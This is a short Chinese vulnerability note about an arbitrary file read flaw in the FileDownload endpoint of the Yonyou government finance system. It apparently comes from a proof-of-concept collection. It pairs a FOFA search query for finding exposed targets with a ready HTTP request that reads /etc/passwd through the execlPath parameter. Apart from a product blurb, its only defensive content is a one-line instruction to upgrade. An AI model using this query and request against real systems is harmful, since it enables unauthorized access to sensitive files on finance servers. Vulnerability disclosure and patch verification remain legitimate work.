### fofa

app="用友-政务财务系统"

**一、漏洞简述**

用友财务软件采用最新的大智物移云的技术，基于事项法会计理论，以业务事项为基础，实时会计、智能财务、精准税务、敏捷财资为核心理念，构建财务会计、管理会计、税务服务、报账服务、财资服务、企业绩效、电子档案服务、共享服务的全新一代财务体系。支持财税一体化，实现入账归档一体化，实现全电发票全流程数字化流转，进一步推进企业和行政事业单位会计核算、财务管理信息化。为企业打造具备实时、智能、精细、多维、可视、生态的全球领先企业数智化财务软件服务平台，助力企业财务数字化转型。其FileDownload接口存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感信息。

**二、漏洞检测poc**

```yaml
GET /bg/attach/FileDownload?execlPath=/etc/passwd  HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

**四、修复**

官方已更新补丁，请升级至最新版本。